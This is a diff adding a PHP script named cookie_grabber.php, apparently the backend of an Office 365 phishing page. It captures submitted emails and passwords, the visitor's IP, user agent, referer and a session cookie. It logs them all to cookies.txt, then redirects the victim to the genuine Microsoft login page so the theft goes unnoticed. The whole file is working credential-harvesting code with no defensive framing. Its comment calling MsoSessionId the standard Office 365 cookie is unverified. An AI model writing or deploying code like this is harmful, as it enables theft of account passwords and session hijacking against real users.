@@ -1,0 +1,29 @@
+<!-- filename: cookie_grabber.php -->
+<?php
+// This script captures the form data and the cookie
+$email = $_POST['email'];
+$password = $_POST['password'];
+
+// Get the User Agent (browser info)
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+// Get the IP address
+$ip = $_SERVER['REMOTE_ADDR'];
+
+// Get the User-Agent
+$ua = $_SERVER['HTTP_USER_AGENT'];
+
+// Get the Referer (where the user came from)
+$referer = $_SERVER['HTTP_REFERER'];
+
+// Get the Session Cookie (This is the ID we want)
+$cookie = $_COOKIE['MsoSessionId']; // This is the standard Office 365 cookie name
+
+// Create a log file named 'cookies.txt' and write the data to it
+$file = fopen("cookies.txt", "a");
+fwrite($file, "Email: $email | Password: $password | IP: $ip | UA: $ua | Referer: $referer | Cookie: $cookie \n");
+fclose($file);
+
+// Redirect the user to the real Microsoft login page
+header("Location: https://login.microsoftonline.com/common/oauth2/authorize?client_id=5e3ce6c4-6b4b-4b2e-b8aa-c9d71dc26c44&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient");
+?>
